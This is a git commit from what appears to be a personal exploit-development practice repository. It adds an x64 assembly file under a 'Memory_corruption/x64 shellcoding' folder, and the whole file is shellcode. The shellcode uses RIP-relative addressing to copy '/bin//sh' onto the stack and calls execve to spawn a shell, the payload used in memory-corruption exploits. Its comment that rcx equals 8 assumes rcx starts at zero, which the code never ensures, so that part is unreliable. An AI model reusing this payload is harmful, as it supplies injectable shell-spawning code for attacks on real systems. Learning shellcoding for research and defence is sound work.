3b71558e48ab2915dfd96f6cc0cc119339a75b7c
harry <sanmiguella@hotmail.com>
2020-03-30 15:23:49 +0800

    relative addressing

---
+++ Memory_corruption/x64 shellcoding/relative/relative.asm
@@ -0,0 +1,27 @@
+global _start
+
+section .text
+
+_start:
+    xor rax, rax            ; Zeroes rax register
+    mul rcx
+    mul rdx
+    add cl, 8               ; rcx = 8 , length of /bin//sh
+
+    push rax                ; For null terminator
+    push rax                ; For /bin//sh string
+
+    lea esi, [rel bin_sh]   ; Source string(rsi)        ->  /bin//sh
+    mov rdi, rsp            ; Destination string(rdi)   ->  Current stack pointer
+    rep movsb               ; Copies string from source to destination till rcx is 0
+
+    ; After rep movsb ends, we need to reset back rdi to beginning of /bin//sh string
+    mov rdi, rsp            ; rdi -> /bin//sh  
+    push rax                ; Null terminator
+    push rdi                ; Pointer to /bin//sh
+    mov rsi, rsp            ; rsi -> Pointer to /bin//sh
+
+    add al, 59              ; Syscall number for execve
+    syscall                 ; Calls kernel
+
+    bin_sh: db "/bin//sh"   ; For relative addressing
